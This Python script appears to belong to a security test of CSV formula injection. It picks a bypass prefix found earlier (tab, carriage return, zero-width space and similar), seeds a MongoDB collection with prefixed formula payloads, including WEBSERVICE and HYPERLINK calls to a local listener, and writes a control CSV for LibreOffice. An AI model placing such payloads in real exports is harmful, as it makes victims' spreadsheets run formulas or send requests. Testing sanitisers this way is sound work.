#!/usr/bin/env python3
from __future__ import annotations

import json
from pathlib import Path

root = Path("final-run")
third = json.loads((root / "thirdwave.json").read_text(encoding="utf-8"))
labels = set(third.get("confirmed_csv_bypass_labels") or [])
known = {"plain_eq", "plain_plus", "plain_minus", "plain_at"}
labels -= known
order = ["tab", "cr", "lf", "vt", "ff", "space", "nbsp", "bom", "zwsp"]
selected = next((label for label in order if label in labels), None)
prefixes = {
    "space": " ",
    "tab": "\t",
    "cr": "\r",
    "lf": "\n",
    "vt": "\x0b",
    "ff": "\x0c",
    "nbsp": "\u00a0",
    "bom": "\ufeff",
    "zwsp": "\u200b",
}
meta = {
    "selected_label": selected,
    "available_labels": sorted(labels),
    "skipped": selected is None,
}
(root / "impact-meta.json").write_text(json.dumps(meta, indent=2), encoding="utf-8")
if selected is None:
    (root / "impact-seed.js").write_text("print('NO_CONFIRMED_BYPASS');\n", encoding="utf-8")
    raise SystemExit(0)

prefix = prefixes[selected]
payloads = {
    "arithmetic": prefix + "=40+2",
    "webservice": prefix + '=WEBSERVICE("http://127.0.0.1:8765/TRR_CSV_WEBSERVICE")',
    "hyperlink": prefix + '=HYPERLINK("http://127.0.0.1:8765/TRR_CSV_HYPERLINK","open")',
    "direct_negative": "=41+1",
    "normal_negative": "TRR_NORMAL_FIELD",
}
meta["payloads"] = payloads
(root / "impact-meta.json").write_text(json.dumps(meta, indent=2, ensure_ascii=False), encoding="utf-8")

def js(value: str) -> str:
    return json.dumps(value, ensure_ascii=False)

seed = [
    "const d = db.getSiblingDB('trrimpact');",
    "try { d.safe.drop(); } catch (e) {}",
    "d.createCollection('safe');",
    "const doc = { marker: 1 };",
]
for key, value in payloads.items():
    seed.append(f"doc[{js(value)}] = {js(key)};")
seed += [
    "d.safe.insertOne(doc);",
    "printjson(d.safe.findOne());",
    "print('IMPACT_SEED_OK');",
]
(root / "impact-seed.js").write_text("\n".join(seed) + "\n", encoding="utf-8")

# A control CSV demonstrates what the same LibreOffice workflow treats as formulas.
import csv
(root / "control").mkdir(exist_ok=True)
with (root / "control" / "control.csv").open("w", newline="", encoding="utf-8") as out:
    writer = csv.writer(out)
    for key, value in payloads.items():
        writer.writerow([key, value])
